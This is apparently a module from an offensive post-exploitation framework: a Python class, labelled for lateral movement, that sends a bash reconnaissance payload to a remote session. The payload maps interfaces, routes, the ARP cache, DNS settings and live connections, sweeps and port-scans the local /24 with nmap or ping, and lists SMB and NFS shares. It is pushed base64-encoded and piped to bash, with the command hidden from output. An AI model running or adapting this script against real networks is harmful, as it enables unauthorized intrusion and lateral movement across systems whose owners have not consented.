"""Network discovery and enumeration script."""

from ..base import OperatorScript, ScriptResult


class NetworkDiscovery(OperatorScript):
    """Integrated network discovery using nmap and built-in tools."""
    
    name = "Network Discovery"
    description = "Comprehensive network discovery and port scanning"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] NETWORK DISCOVERY"
echo "===================="
echo ""

echo "[+] Network interfaces:"
ip a 2>/dev/null || ifconfig
echo ""

echo "[+] Routing table:"
ip route 2>/dev/null || route -n
echo ""

echo "[+] ARP cache:"
ip neigh 2>/dev/null || arp -a
echo ""

echo "[+] DNS configuration:"
cat /etc/resolv.conf 2>/dev/null
echo ""

echo "[+] Active network connections:"
ss -tunap 2>/dev/null || netstat -tunap 2>/dev/null
echo ""

echo "[+] Checking for nmap..."
if command -v nmap &>/dev/null; then
    echo "[!] nmap available - performing ping sweep on local network"
    LOCAL_NET=$(ip route | grep default | awk '{print $3}' | cut -d. -f1-3).0/24
    echo "[*] Scanning $LOCAL_NET"
    nmap -sn -T4 $LOCAL_NET 2>/dev/null | grep "Nmap scan"
    echo ""
    echo "[*] Top 100 ports scan on discovered hosts"
    nmap -sT -T4 --top-ports 100 $LOCAL_NET 2>/dev/null
else
    echo "[-] nmap not found, using basic ping sweep"
    LOCAL_NET=$(ip route | grep default | awk '{print $3}' | cut -d. -f1-3)
    for i in {1..254}; do
        (ping -c 1 -W 1 $LOCAL_NET.$i &>/dev/null && echo "[+] $LOCAL_NET.$i is up") &
    done
    wait
fi
echo ""

echo "[+] Searching for SMB shares:"
smbclient -L localhost -N 2>/dev/null || echo "[-] smbclient not available"
echo ""

echo "[+] Searching for NFS exports:"
showmount -e localhost 2>/dev/null || echo "[-] showmount not available"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Running network discovery...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Network discovery executed",
                metadata={"script": "network_discovery"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
